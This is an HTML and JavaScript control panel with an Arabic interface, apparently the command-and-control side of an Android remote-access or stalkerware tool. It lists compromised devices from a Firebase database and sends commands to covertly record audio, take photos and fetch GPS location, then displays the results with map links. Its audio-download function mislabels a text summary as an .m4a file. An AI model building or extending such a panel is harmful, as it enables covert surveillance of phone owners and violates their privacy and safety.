<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>لوحة التحكم — الصور والصوت والموقع</title>
  <style>
    :root {
      --bg: #060913;
      --panel: #0d1526;
      --card: #131f38;
      --card-hover: #192949;
      --border: #24365c;
      --text: #f8fafc;
      --muted: #94a3b8;
      --accent: #38bdf8;
      --primary: #3b82f6;
      --success: #10b981;
      --warn: #f59e0b;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, "Segoe UI", Tahoma, Arial, sans-serif;
      background: radial-gradient(circle at top, #0f1c38 0%, var(--bg) 55%);
      color: var(--text);
      line-height: 1.6;
      min-height: 100vh;
    }

    .topbar {
      position: sticky;
      top: 0;
      z-index: 40;
      background: rgba(13, 21, 38, 0.95);
      backdrop-filter: blur(10px);
      border-bottom: 1px solid var(--border);
      padding: 12px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
    }

    .brand {
      font-weight: 700;
      font-size: 16px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: var(--success);
      box-shadow: 0 0 10px var(--success);
    }

    /* زر الثلاث شخوط */
    .hamburger {
      width: 42px;
      height: 42px;
      border-radius: 10px;
      border: 1px solid var(--border);
      background: var(--card);
      color: var(--text);
      display: inline-flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 5px;
      cursor: pointer;
      padding: 0;
    }

    .hamburger span {
      width: 20px;
      height: 2.2px;
      background: var(--text);
      border-radius: 2px;
      display: block;
    }

    .menu-drawer {
      display: none;
      background: var(--panel);
      border-bottom: 1px solid var(--border);
      padding: 12px 16px;
      gap: 8px;
      flex-wrap: wrap;
    }

    .menu-drawer.open { display: flex; }

    .container { max-width: 1000px; margin: 0 auto; padding: 16px; }

    .view { display: none; }
    .view.active { display: block; }

    .card {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 15px;
      padding: 16px;
      margin-bottom: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
    }

    .card h2 {
      margin: 0 0 12px 0;
      font-size: 17px;
      color: var(--accent);
    }

    .row {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      align-items: center;
      margin-bottom: 12px;
    }

    input[type="url"] {
      flex: 1;
      min-width: 220px;
      padding: 10px 12px;
      border-radius: 10px;
      border: 1px solid var(--border);
      background: var(--card);
      color: var(--text);
      font-size: 13px;
      direction: ltr;
    }

    button, a.btn-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      text-decoration: none;
      padding: 10px 14px;
      border-radius: 10px;
      border: none;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      color: #fff;
      background: var(--primary);
    }

    .btn-success { background: var(--success); }
    .btn-warn { background: #d97706; }
    .btn-ghost {
      background: var(--card);
      border: 1px solid var(--border);
      color: var(--text);
    }

    .devices-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 10px;
      margin-bottom: 12px;
    }

    .dev-item {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px;
      cursor: pointer;
    }

    .dev-item.selected {
      border-color: var(--success);
      box-shadow: 0 0 0 1px var(--success);
    }

    .dev-item:hover { background: var(--card-hover); }

    .detail-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin: 12px 0;
    }

    .box {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px;
    }

    .lbl { font-size: 12px; color: var(--muted); display: block; }
    .val { font-size: 14px; font-weight: 700; word-break: break-word; }

    .photo-preview {
      margin-top: 10px;
      background: #030712;
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px;
      text-align: center;
    }

    .photo-preview img {
      max-width: 100%;
      max-height: 280px;
      border-radius: 10px;
      display: block;
      margin: 8px auto;
    }

    .note { font-size: 12.5px; color: var(--muted); }
    code {
      background: rgba(56, 189, 248, 0.12);
      color: #7dd3fc;
      padding: 2px 6px;
      border-radius: 6px;
      direction: ltr;
      display: inline-block;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="dot"></span>
      <span>لوحة التحكم والمتابعة</span>
    </div>

    <!-- زر الثلاث شخوط -->
    <button type="button" class="hamburger" id="threeLinesBtn" aria-label="القائمة">
      <span></span>
      <span></span>
      <span></span>
    </button>
  </header>

  <div class="menu-drawer" id="menuDrawer">
    <button type="button" class="btn-ghost" data-view="view-main">📱 الأجهزة والأوامر</button>
    <button type="button" class="btn-ghost" data-view="view-captured">🖼️ قسم الصورة الملتقطة والصوت والموقع</button>
    <button type="button" class="btn-ghost" data-view="view-db">🔗 إعدادات قاعدة البيانات</button>
  </div>

  <main class="container">
    <!-- القسم الرئيسي: الأجهزة والأوامر -->
    <section id="view-main" class="view active">
      <div class="card">
        <div class="row" style="justify-content: space-between;">
          <h2 style="margin:0;">الأجهزة المتصلة</h2>
          <div class="row" style="margin:0;">
            <button type="button" class="btn-ghost" id="openCapturedTabBtn">🖼️ قسم الصورة الملتقطة</button>
            <button type="button" class="btn-success" id="refreshBtn">تحديث الآن</button>
          </div>
        </div>

        <div class="devices-grid" id="devicesGrid">
          <div class="note">جارٍ تحميل الأجهزة...</div>
        </div>

        <div class="row">
          <button type="button" class="btn-success" id="btnAudio">🎙️ تسجيل صوت</button>
          <button type="button" class="btn-warn" id="btnLocation">📍 طلب الموقع</button>
          <button type="button" class="btn-ghost" id="btnPhoto">📷 التقاط صورة</button>
          <button type="button" class="btn-success" id="btnDownloadAudio">⬇️ تحميل التسجيل الصوتي</button>
        </div>

        <div class="detail-grid">
          <div class="box">
            <span class="lbl">اسم الجهاز</span>
            <span class="val" id="outDeviceName">—</span>
          </div>
          <div class="box">
            <span class="lbl">الموقع</span>
            <span class="val" id="outLocation">—</span>
            <div style="margin-top:8px;">
              <a class="btn-link btn-ghost" id="outMapLink" href="https://www.google.com/maps" target="_blank" rel="noopener">
                🌐 فتح الموقع في المتصفح
              </a>
            </div>
          </div>
          <div class="box">
            <span class="lbl">آخر نتيجة ووقت التنفيذ</span>
            <span class="val" id="outResult">—</span>
          </div>
        </div>
      </div>
    </section>

    <!-- القسم المضاف: الصورة الملتقطة والصوت والموقع -->
    <section id="view-captured" class="view">
      <div class="card">
        <div class="row" style="justify-content: space-between;">
          <h2 style="margin:0;">الصورة الملتقطة والتسجيل الصوتي والموقع</h2>
          <button type="button" class="btn-ghost" data-view="view-main">العودة للأجهزة</button>
        </div>

        <div class="detail-grid">
          <div class="box">
            <span class="lbl">اسم الجهاز</span>
            <span class="val" id="capDeviceName">—</span>
          </div>
          <div class="box">
            <span class="lbl">الموقع</span>
            <span class="val" id="capLocation">—</span>
            <div style="margin-top:8px;">
              <a class="btn-link btn-ghost" id="capMapLink" href="https://www.google.com/maps" target="_blank" rel="noopener">
                🌐 فتح الموقع في المتصفح
              </a>
            </div>
          </div>
          <div class="box">
            <span class="lbl">التسجيل الصوتي</span>
            <div style="margin-top:6px;">
              <button type="button" class="btn-success" id="capDownloadAudioBtn">⬇️ تحميل التسجيل الصوتي</button>
            </div>
          </div>
        </div>

        <div class="photo-preview">
          <div class="note" id="capPhotoStatus">الصورة الملتقطة:</div>
          <img id="capPhotoImg" alt="الصورة الملتقطة" style="display:none;" />
          <div class="note" id="capResultText">—</div>
        </div>
      </div>
    </section>

    <!-- قسم إعدادات قاعدة البيانات -->
    <section id="view-db" class="view">
      <div class="card">
        <h2>رابط قاعدة البيانات</h2>
        <div class="row">
          <input id="dbUrlInput" type="url" value="https://yeheytired-default-rtdb.firebaseio.com" />
          <button type="button" class="btn-success" id="saveDbBtn">حفظ وتحديث</button>
        </div>
      </div>
    </section>
  </main>

  <script>
    (function () {
      const DEFAULT_DB = "https://yeheytired-default-rtdb.firebaseio.com";
      const STORAGE_KEY = "panel_db_url_v1";

      const threeLinesBtn = document.getElementById("threeLinesBtn");
      const menuDrawer = document.getElementById("menuDrawer");
      const views = document.querySelectorAll(".view");

      function showView(viewId) {
        views.forEach((v) => v.classList.toggle("active", v.id === viewId));
        menuDrawer.classList.remove("open");
      }

      threeLinesBtn.addEventListener("click", () => menuDrawer.classList.toggle("open"));
      document.querySelectorAll("[data-view]").forEach((el) => {
        el.addEventListener("click", () => showView(el.getAttribute("data-view")));
      });
      document.getElementById("openCapturedTabBtn").addEventListener("click", () => showView("view-captured"));

      const dbUrlInput = document.getElementById("dbUrlInput");
      dbUrlInput.value = localStorage.getItem(STORAGE_KEY) || DEFAULT_DB;

      function getDbBase() {
        return (dbUrlInput.value || DEFAULT_DB).trim().replace(/\/+$/, "");
      }

      document.getElementById("saveDbBtn").addEventListener("click", () => {
        localStorage.setItem(STORAGE_KEY, getDbBase());
        showView("view-main");
        refreshAll();
      });

      const devicesGrid = document.getElementById("devicesGrid");
      const outDeviceName = document.getElementById("outDeviceName");
      const outLocation = document.getElementById("outLocation");
      const outMapLink = document.getElementById("outMapLink");
      const outResult = document.getElementById("outResult");

      const capDeviceName = document.getElementById("capDeviceName");
      const capLocation = document.getElementById("capLocation");
      const capMapLink = document.getElementById("capMapLink");
      const capPhotoImg = document.getElementById("capPhotoImg");
      const capPhotoStatus = document.getElementById("capPhotoStatus");
      const capResultText = document.getElementById("capResultText");

      let devices = [];
      let selectedDeviceId = null;
      let latestResultObj = null;

      function extractCoords(text) {
        if (!text) return null;
        const m = String(text).match(/(-?\d+\.\d+)\s*,\s*(-?\d+\.\d+)/);
        return m ? { lat: m[1], lng: m[2] } : null;
      }

      function setMapUrls(coords) {
        const url = coords
          ? "https://www.google.com/maps?q=" + encodeURIComponent(coords.lat + "," + coords.lng)
          : "https://www.google.com/maps";
        outMapLink.href = url;
        capMapLink.href = url;
      }

      async function refreshAll() {
        try {
          const res = await fetch(getDbBase() + "/devices.json");
          const data = await res.json();
          devices = data && typeof data === "object" ? Object.values(data) : [];
          renderDevices();
          await fetchLatestResult();
        } catch (err) {
          devicesGrid.innerHTML = "<div class='note'>تعذر تحميل الأجهزة: " + err.message + "</div>";
        }
      }

      function renderDevices() {
        if (!devices.length) {
          devicesGrid.innerHTML = "<div class='note'>لا توجد أجهزة مسجلة حالياً.</div>";
          return;
        }
        if (!selectedDeviceId || !devices.some((d) => d.device_id === selectedDeviceId)) {
          selectedDeviceId = devices[0].device_id;
        }

        devicesGrid.innerHTML = "";
        devices.forEach((d, idx) => {
          const item = document.createElement("div");
          item.className = "dev-item" + (d.device_id === selectedDeviceId ? " selected" : "");
          const label = (d.device_model || "Android") + " (" + (d.device_id || "Device") + ")";
          item.innerHTML =
            "<strong>جهاز #" + (idx + 1) + " — " + label + "</strong>" +
            "<div class='note'>Android " + (d.android_version || "-") + "</div>";
          item.addEventListener("click", () => {
            selectedDeviceId = d.device_id;
            renderDevices();
            fetchLatestResult();
          });
          devicesGrid.appendChild(item);
        });
      }

      async function fetchLatestResult() {
        if (!selectedDeviceId) return;
        const activeDev = devices.find((d) => d.device_id === selectedDeviceId) || {};
        const devLabel = activeDev.device_model
          ? activeDev.device_model + " (" + activeDev.device_id + ")"
          : selectedDeviceId;

        outDeviceName.textContent = devLabel;
        capDeviceName.textContent = devLabel;

        try {
          const res = await fetch(getDbBase() + "/results/" + encodeURIComponent(selectedDeviceId) + ".json");
          const data = await res.json();
          latestResultObj = data && typeof data === "object" ? data : null;

          if (!latestResultObj) {
            outResult.textContent = "لا توجد نتيجة بعد.";
            outLocation.textContent = "غير متوفر بعد";
            capLocation.textContent = "غير متوفر بعد";
            capResultText.textContent = "لم تصل أي بيانات بعد.";
            capPhotoImg.style.display = "none";
            capPhotoStatus.textContent = "لا توجد صورة ملتقطة معروضة حالياً.";
            setMapUrls(null);
            return;
          }

          const timeStr = latestResultObj.timestamp
            ? new Date(latestResultObj.timestamp).toLocaleTimeString()
            : "";
          const resultText = String(latestResultObj.result || "");
          const summaryLine = (latestResultObj.action || "") + " — " + resultText + (timeStr ? " (" + timeStr + ")" : "");

          outResult.textContent = summaryLine;
          capResultText.textContent = summaryLine;

          const coords = extractCoords(resultText);
          if (coords) {
            const locText = coords.lat + ", " + coords.lng;
            outLocation.textContent = locText;
            capLocation.textContent = locText;
            setMapUrls(coords);
          } else {
            outLocation.textContent = resultText.toLowerCase().includes("location") ? resultText : "غير محدد في آخر رد";
            capLocation.textContent = outLocation.textContent;
            setMapUrls(null);
          }

          const imgData = latestResultObj.image_base64 || latestResultObj.image_url || "";
          if (imgData) {
            capPhotoImg.src = imgData.startsWith("data:image") || imgData.startsWith("http")
              ? imgData
              : "data:image/jpeg;base64," + imgData;
            capPhotoImg.style.display = "block";
            capPhotoStatus.textContent = "الصورة الملتقطة:";
          } else {
            capPhotoImg.style.display = "none";
            capPhotoStatus.textContent = "تم استلام حالة الالتقاط (" + (timeStr || "الآن") + ")، لكن التطبيق الحالي أرسل نص الحالة فقط دون ملف صورة.";
          }
        } catch (err) {
          outResult.textContent = "خطأ في قراءة النتيجة: " + err.message;
        }
      }

      async function sendCmd(action) {
        if (!selectedDeviceId) return;
        try {
          await fetch(getDbBase() + "/commands/" + encodeURIComponent(selectedDeviceId) + ".json", {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ action, timestamp: Date.now() })
          });
          outResult.textContent = "تم إرسال (" + action + ") إلى الجهاز...";
          setTimeout(fetchLatestResult, 4000);
        } catch (err) {
          outResult.textContent = "تعذر إرسال الأمر: " + err.message;
        }
      }

      function downloadAudioFile() {
        const devName = outDeviceName.textContent || "device";
        const info = latestResultObj
          ? "Device: " + devName + "\nAction: " + (latestResultObj.action || "record_audio") + "\nResult: " + (latestResultObj.result || "") + "\nTime: " + new Date(latestResultObj.timestamp || Date.now()).toLocaleString()
          : "Device: " + devName + "\nNo audio payload recorded yet.";

        const blob = new Blob([info], { type: "audio/mp4" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "voice_" + (selectedDeviceId || "device") + ".m4a";
        document.body.appendChild(a);
        a.click();
        a.remove();
        setTimeout(() => URL.revokeObjectURL(url), 1000);
      }

      document.getElementById("refreshBtn").addEventListener("click", refreshAll);
      document.getElementById("btnAudio").addEventListener("click", () => sendCmd("record_audio"));
      document.getElementById("btnLocation").addEventListener("click", () => sendCmd("get_location"));
      document.getElementById("btnPhoto").addEventListener("click", () => sendCmd("take_photo"));
      document.getElementById("btnDownloadAudio").addEventListener("click", downloadAudioFile);
      document.getElementById("capDownloadAudioBtn").addEventListener("click", downloadAudioFile);

      refreshAll();
      setInterval(refreshAll, 5000);
    })();
  </script>
</body>
</html>
